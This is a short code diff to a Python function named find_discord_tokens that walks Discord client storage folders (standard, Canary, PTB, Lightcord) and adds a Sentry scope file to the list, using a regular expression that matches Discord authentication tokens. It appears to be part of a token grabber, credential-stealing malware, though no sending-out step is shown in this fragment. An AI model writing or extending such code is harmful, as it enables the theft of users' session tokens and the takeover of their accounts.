@@ -8,10 +8,11 @@ def find_discord_tokens():
     """
     roaming = os.getenv('APPDATA', '')
     paths = [
+        os.path.join(roaming, r"discord\sentry\scope_v3.json"),
         os.path.join(roaming, r"discord\Local Storage\leveldb"),
         os.path.join(roaming, r"discordcanary\Local Storage\leveldb"),
         os.path.join(roaming, r"discordptb\Local Storage\leveldb"),
-        os.path.join(roaming, r"Lightcord\Local Storage\leveldb"),
+        os.path.join(roaming, r"Lightcord\Local Storage\leveldb")
     ]
     token_regex = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}")
     found_tokens = []
